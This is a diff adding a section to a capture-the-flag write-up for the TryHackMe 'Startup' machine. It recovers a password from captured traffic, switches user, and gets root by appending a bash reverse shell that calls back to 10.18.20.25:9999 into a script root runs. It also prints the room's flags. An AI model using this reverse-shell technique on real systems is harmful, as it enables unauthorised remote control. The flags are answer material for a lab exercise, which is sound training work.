@@ -243,8 +243,119 @@ local: suspicious.pcapng remote: suspicious.pcapng
 We can instantly see that there is a lot going on here.
 ![grafik](https://github.com/Aryt3/writeups/assets/110562298/bdb9ccf3-59d0-434d-91c8-1e249e52a56e)
 
-Looking at the http requests we can see some interesting things.
+Looking at the `http` requests we can see some interesting things.
 ![grafik](https://github.com/Aryt3/writeups/assets/110562298/c3b5a8b7-738c-4dd3-8296-13f35ba9966c)
+
+Now I can dump all the info into a `.txt` file and try to get more info.
+
+After inspecting the output some more I was able to discover a login atempt
+```sh
+[sudo] password for www-data:
+c4ntg3t3n0ughsp1c3
+```
+
+Well now we got the password `c4ntg3t3n0ughsp1c3` for the user `lennie`. <br/>
+Surely this is the password I have been searching for:
+```sh
+www-data@startup:/$ su lennie 
+Password: c4ntg3t3n0ughsp1c3
+lennie@startup:/$ whoami
+lennie
+```
+
+Getting the second Flag:
+```sh
+lennie@startup:/$ ls /home/lennie/
+Documents  scripts  user.txt
+lennie@startup:/$ cat /home/lennie/user.txt
+THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+```
+
+Looking for basic priviledge escalation:
+```sh
+lennie@startup:/$ sudo -l
+sudo: unable to resolve host startup
+[sudo] password for lennie: c4ntg3t3n0ughsp1c3
+
+Sorry, user lennie may not run sudo on startup.
+```
+
+Taking a look around in the home directory of user `lennie`:
+```sh
+lennie@startup:~$ ls -la Documents
+total 20
+drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 .
+drwx------ 4 lennie lennie 4096 Oct  8 14:41 ..
+-rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
+-rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
+-rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
+lennie@startup:~$ ls -la scripts
+total 16
+drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
+drwx------ 4 lennie lennie 4096 Oct  8 14:41 ..
+-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+-rw-r--r-- 1 root   root      1 Oct  8 15:02 startup_list.txt
+```
+
+Taking a look at the files in `/scripts`:
+```sh
+$ cat scripts/startup_list.txt
+
+$ cat scripts/planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+```
+
+It doesn't seem we can edit files in this directory but it seems like we can edit `/etc/printer.sh`:
+```sh
+$ ls -la /etc/ 
+total 844
+-rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
+```
+
+Editing the `/etc/print.sh` file to get a reverse shell as root:
+```sh
+$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+bash -i >& /dev/tcp/10.18.20.25/9999 0>&1
+```
+
+Executing the shell:
+```sh
+$ ./scripts/planner.sh
+./scripts/planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied
+Done!
+/etc/print.sh: connect: Connection refused
+/etc/print.sh: line 3: /dev/tcp/10.18.20.25/9999: Connection refused
+```
+
+Netcat Listener:
+```sh
+nc -lnvp 9999            
+listening on [any] 9999 ...
+connect to [10.18.20.25] from (UNKNOWN) [10.10.76.230] 56066
+bash: cannot set terminal process group (3979): Inappropriate ioctl for device
+bash: no job control in this shell
+root@startup:~# whoami
+root
+```
+
+Getting the Root Flag:
+```sh
+root@startup:~# ls
+ls
+root.txt
+root@startup:~# cat root.txt
+cat root.txt
+THM{f963aaa6a430f210222158ae15c3d76d}
+```
+
+
 
 
 
